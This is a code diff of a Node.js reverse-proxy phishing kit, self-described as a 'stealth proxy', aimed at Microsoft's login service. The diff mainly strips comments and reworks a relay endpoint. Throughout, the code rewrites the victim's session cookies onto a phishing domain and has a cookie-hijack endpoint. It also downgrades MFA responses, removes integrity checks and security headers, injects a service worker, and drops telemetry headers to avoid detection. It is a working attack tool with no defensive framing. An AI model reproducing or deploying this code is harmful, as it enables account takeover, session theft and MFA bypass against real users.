@@ -1,18 +1,6 @@
 // ============================================================
-// FINAL STEALTH PROXY SERVER – EvilWorker Core + Carlos Tactics
-// FIXED: Handles /api/gateway with query parameters
+// FINAL STEALTH PROXY – with pathname fix
 // ============================================================
-// Customized for file paths:
-//   portal_a7x9k.html, error_4m2p.html, worker_8t2r.js, assets/bundle_x9f3.js
-// ============================================================
-// Usage: node proxy_server.js
-// Environment variables:
-//   ENCRYPTION_KEY  (32-char hex, default random)
-//   PHISHING_DOMAIN (your domain, e.g., app.azurewebsites.net)
-//   REDIRECT_URL    (fallback, e.g., https://google.com)
-//   TARGET_HOST     (real service, e.g., login.microsoftonline.com)
-// ============================================================
-
 import { createServer } from 'http';
 import { request as httpsRequest } from 'https';
 import { request as httpRequest } from 'http';
@@ -22,7 +10,6 @@ import { createCipheriv, randomBytes } from 'crypto';
 import { gunzip, inflate, brotliDecompress, zstdDecompress, gzip, deflate, brotliCompress, zstdCompress } from 'zlib';
 import { promisify } from 'util';
 
-// ---- Promisify zlib ----
 const gunzipAsync = promisify(gunzip);
 const inflateAsync = promisify(inflate);
 const brotliDecompressAsync = promisify(brotliDecompress);
@@ -32,18 +19,14 @@ const deflateAsync = promisify(deflate);
 const brotliCompressAsync = promisify(brotliCompress);
 const zstdCompressAsync = promisify(zstdCompress);
 
-// ---- Configuration ----
 const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || randomBytes(32).toString('hex');
 const PHISHING_DOMAIN = process.env.PHISHING_DOMAIN || 'localhost';
 const REDIRECT_URL = process.env.REDIRECT_URL || 'https://www.google.com';
 const TARGET_HOST = process.env.TARGET_HOST || 'login.microsoftonline.com';
 
-console.log('[CONFIG] ENCRYPTION_KEY set:', ENCRYPTION_KEY.substring(0, 8) + '...');
 console.log('[CONFIG] PHISHING_DOMAIN:', PHISHING_DOMAIN);
 console.log('[CONFIG] REDIRECT_URL:', REDIRECT_URL);
-console.log('[CONFIG] TARGET_HOST:', TARGET_HOST);
 
-// ---- Bidirectional domain mapping ----
 const SUBDOMAIN_MAPPING = {
   [PHISHING_DOMAIN]: TARGET_HOST,
   [`login.${PHISHING_DOMAIN}`]: 'login.microsoft.com',
@@ -57,11 +40,9 @@ for (const [phish, real] of Object.entries(SUBDOMAIN_MAPPING)) {
   REVERSE_MAPPING[real] = phish;
 }
 
-// ---- Entry point ----
 const ENTRY_PATH = '/auth/start';
 const TARGET_PARAM = 'dest';
 
-// ---- File paths ----
 const FILES = {
   index: 'portal_a7x9k.html',
   notFound: 'error_4m2p.html',
@@ -75,15 +56,11 @@ const PATHS = {
   session: '/api/session'
 };
 
-// ---- Logging ----
 const LOG_DIR = join(process.cwd(), 'data');
 if (!existsSync(LOG_DIR)) mkdirSync(LOG_DIR);
 const logStreams = {};
 const sessions = {};
 
-// ============================================================
-// MAIN PROXY ENGINE
-// ============================================================
 class StealthProxy {
   constructor() {
     this.encryptionKey = ENCRYPTION_KEY;
@@ -96,14 +73,14 @@ class StealthProxy {
 
   start(port = process.env.PORT || 3000) {
     const server = createServer(this._onRequest.bind(this));
-    server.listen(port, () => console.log(`[PROXY] Running on port ${port}`));
+    server.listen(port, () => console.log(`[PROXY] Running on ${port}`));
   }
 
   async _onRequest(req, res) {
     const { method, url, headers } = req;
     console.log(`[REQUEST] ${method} ${url}`);
 
-    // ---- Extract path without query ----
+    // ---- Extract path WITHOUT query string ----
     const pathname = url.split('?')[0];
     const sessionId = this._getSession(headers.cookie);
 
@@ -126,7 +103,7 @@ class StealthProxy {
       return this._serveLandingPage(req, res, url);
     }
 
-    // ---- Known static paths ----
+    // ---- Static files ----
     if (pathname === PATHS.serviceWorker) {
       console.log('[REQUEST] ✅ Serving SW');
       return this._serveFile(res, PATHS.serviceWorker.slice(1), 'text/javascript');
@@ -136,46 +113,47 @@ class StealthProxy {
       return this._serveFile(res, FILES.script, 'text/javascript');
     }
 
-    // ---- Relay endpoint (with or without session) ----
+    // ---- RELAY endpoint (CRITICAL FIX) ----
     if (pathname === PATHS.relay) {
       console.log('[REQUEST] ✅ Relay endpoint');
-      // If there's a target parameter, handle it
       const parsed = new URL(url, `http://${headers.host}`);
       const targetParam = parsed.searchParams.get('target');
-      if (targetParam) {
-        console.log('[REQUEST] Relay target:', targetParam.substring(0, 60) + '...');
-        // If no session, create one from the target
-        if (!sessionId) {
-          try {
-            const target = new URL(decodeURIComponent(targetParam));
-            const { name, value } = this._createSession(target);
-            res.setHeader('Set-Cookie', `${name}=${value}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
-            sessions[name].target = {
-              protocol: target.protocol,
-              hostname: target.hostname,
-              port: target.port || (target.protocol === 'https:' ? 443 : 80),
-              path: target.pathname + target.search,
-              host: target.host
-            };
-            console.log('[RELAY] New session created:', name);
-            // Now proxy the request using the session
-            return this._handleProxiedRequest(req, res, name);
-          } catch (e) {
-            console.log('[RELAY] Error creating session:', e.message);
-          }
-        } else {
-          // Existing session – proxy
-          return this._handleProxiedRequest(req, res, sessionId);
+      if (!targetParam) {
+        console.log('[RELAY] No target, redirecting');
+        res.writeHead(302, { Location: this.redirectUrl });
+        res.end();
+        return;
+      }
+      console.log('[RELAY] Target:', targetParam.substring(0, 80) + '...');
+
+      // Create or use session
+      let sid = sessionId;
+      if (!sid) {
+        try {
+          const target = new URL(decodeURIComponent(targetParam));
+          const { name, value } = this._createSession(target);
+          res.setHeader('Set-Cookie', `${name}=${value}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
+          sessions[name].target = {
+            protocol: target.protocol,
+            hostname: target.hostname,
+            port: target.port || (target.protocol === 'https:' ? 443 : 80),
+            path: target.pathname + target.search,
+            host: target.host
+          };
+          sid = name;
+          console.log('[RELAY] Session created:', sid);
+        } catch (e) {
+          console.log('[RELAY] Invalid target:', e.message);
+          res.writeHead(302, { Location: this.redirectUrl });
+          res.end();
+          return;
         }
       }
-      // If no target, fallback
-      console.log('[RELAY] No target, redirecting');
-      res.writeHead(302, { Location: this.redirectUrl });
-      res.end();
-      return;
+      // Proxy the request
+      return this._handleProxiedRequest(req, res, sid);
     }
 
-    // ---- Session-only endpoints (session or nav) ----
+    // ---- Session-only endpoints ----
     if (sessionId) {
       if (pathname === PATHS.session) {
         return this._handleCookieHijack(req, res, sessionId);
@@ -183,8 +161,7 @@ class StealthProxy {
       if (pathname === PATHS.nav) {
         return this._handleNavRewrite(req, res, sessionId);
       }
-      // If it's a request from an existing session but not a known path, proxy it
-      // (handles requests for CSS, JS, etc. that come after the page loads)
+      // Any other request with session – proxy it
       console.log('[REQUEST] Proxying via session');
       return this._handleProxiedRequest(req, res, sessionId);
     }
@@ -195,7 +172,6 @@ class StealthProxy {
     res.end();
   }
 
-  // ---- Serve landing page ----
   _serveLandingPage(req, res, url) {
     try {
       const match = url.match(new RegExp(`(?<=${TARGET_PARAM}=)[^&]+`));
@@ -207,7 +183,7 @@ class StealthProxy {
         const { name, value } = this._createSession(target);
         res.setHeader('Set-Cookie', `${name}=${value}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
         sessionId = name;
-        console.log('[LANDING] Session created:', sessionId);
+        console.log('[LANDING] Session:', sessionId);
       }
       sessions[sessionId].target = {
         protocol: target.protocol,
@@ -225,13 +201,11 @@ class StealthProxy {
     }
   }
 
-  // ---- Serve static file ----
   _serveFile(res, filePath, mime) {
     res.writeHead(200, { 'Content-Type': mime });
     createReadStream(filePath).pipe(res);
   }
 
-  // ---- Session management ----
   _getSession(cookieHeader) {
     if (!cookieHeader) return null;
     const cookies = cookieHeader.split('; ');
@@ -260,17 +234,12 @@ class StealthProxy {
     stream.write(JSON.stringify({ iv: iv.toString('hex'), data: encrypted.toString('hex') }) + '\n');
   }
 
-  // ---- Main proxy handler (fetches and rewrites content) ----
   async _handleProxiedRequest(req, res, sessionId) {
-    console.log('[PROXY] Handling request');
     const session = sessions[sessionId];
     if (!session) {
-      console.log('[PROXY] No session');
       res.writeHead(302, { Location: this.redirectUrl });
-      res.end();
-      return;
+      return res.end();
     }
-
     const { method, headers, url } = req;
     let targetUrl;
     const parsed = new URL(url, `http://${headers.host}`);
@@ -295,7 +264,6 @@ class StealthProxy {
       effectiveHost = this.subdomainMap[effectiveHost];
     }
 
-    // Forward request
     const options = {
       hostname: targetHostname,
       port: targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80),
@@ -307,12 +275,10 @@ class StealthProxy {
     delete options.headers.host;
     options.headers.host = effectiveHost;
 
-    const dropHeaders = [
-      'x-forwarded-for', 'x-arr-log-id', 'client-ip', 'x-site-deployment-id',
+    const dropHeaders = ['x-forwarded-for', 'x-arr-log-id', 'client-ip', 'x-site-deployment-id',
       'x-canary', 'x-microsoft-telemetry', 'x-ms-telemetry', 'x-ms-request-id',
       'x-forwarded-proto', 'x-appservice-proto', 'x-arr-ssl', 'x-forwarded-tlsversion',
-      'x-original-url', 'x-waws-unencoded-url', 'x-client-ip', 'x-client-port'
-    ];
+      'x-original-url', 'x-waws-unencoded-url', 'x-client-ip', 'x-client-port'];
     for (const h of dropHeaders) delete options.headers[h];
 
     let bodyBuffer = [];
@@ -349,7 +315,7 @@ class StealthProxy {
             }
           }
 
-          // ---- MFA downgrade ----
+          // MFA downgrade
           if (isJson && targetUrl.pathname.includes('/common/login')) {
             try {
               const json = JSON.parse(fullBody.toString('utf8'));
@@ -372,25 +338,22 @@ class StealthProxy {
             } catch (e) {}
           }
 
-          // ---- HTML rewrite and injection ----
+          // HTML rewrite
           if (isHtml) {
             let html = fullBody.toString('utf8');
-            // SRI removal
             html = html.replace(/<script[^>]+\s+integrity="[^"]*"/g, '<script');
             html = html.replace(/<link[^>]+\s+integrity="[^"]*"/g, '<link');
             html = html.replace(/integrity\s*=\s*"[^"]*"/g, '');
-            // redirect_uri rewrite
             html = html.replace(/redirect_uri=https%3A%2F%2Flogin\.microsoftonline\.com/g,
                                 `redirect_uri=https%3A%2F%2F${this.phishingDomain}`);
             html = html.replace(/redirect_uri=https:\/\/login\.microsoftonline\.com/g,
                                 `redirect_uri=https://${this.phishingDomain}`);
-            // Inject SW registration script
+            // Inject script
             const injectCode = `
               <script>
                 (async function() {
                   try {
                     await navigator.serviceWorker.register('/worker_8t2r.js', { scope: '/' });
-                    console.log('SW registered');
                   } catch(e) {}
                 })();
               </script>
@@ -405,7 +368,7 @@ class StealthProxy {
             fullBody = Buffer.from(html);
           }
 
-          // ---- Cookie domain rewrite ----
+          // Cookie domain rewrite
           if (proxyRes.headers['set-cookie']) {
             let cookies = proxyRes.headers['set-cookie'];
             if (!Array.isArray(cookies)) cookies = [cookies];
@@ -421,7 +384,6 @@ class StealthProxy {
             proxyRes.headers['set-cookie'] = cookies.join(', ');
           }
 
-          // ---- Re-compress ----
           if (encodings.length) {
             for (let enc of encodings.reverse()) {
               try {
@@ -433,7 +395,6 @@ class StealthProxy {
             }
           }
 
-          // ---- Send response ----
           const newHeaders = { ...proxyRes.headers };
           const securityHeaders = ['content-security-policy', 'x-frame-options', 'x-xss-protection', 'x-content-type-options', 'cross-origin-opener-policy', 'cross-origin-embedder-policy', 'cross-origin-resource-policy', 'permissions-policy', 'service-worker-allowed'];
           for (const h of securityHeaders) delete newHeaders[h];
@@ -457,8 +418,7 @@ class StealthProxy {
     });
   }
 
-  // ---- Cookie hijack ----
-  async _handleCookieHijack(req, res, sessionId) {
+  _handleCookieHijack(req, res, sessionId) {
     let body = '';
     req.on('data', chunk => body += chunk);
     req.on('end', () => {
@@ -474,8 +434,7 @@ class StealthProxy {
     });
   }
 
-  // ---- Navigation rewrite ----
-  async _handleNavRewrite(req, res, sessionId) {
+  _handleNavRewrite(req, res, sessionId) {
     const url = new URL(req.url, `http://${req.headers.host}`);
     const targetParam = url.searchParams.get(TARGET_PARAM);
     if (!targetParam) { res.writeHead(400); return res.end(); }
@@ -520,6 +479,5 @@ class StealthProxy {
   }
 }
 
-// ---- Start ----
 const proxy = new StealthProxy();
 proxy.start();
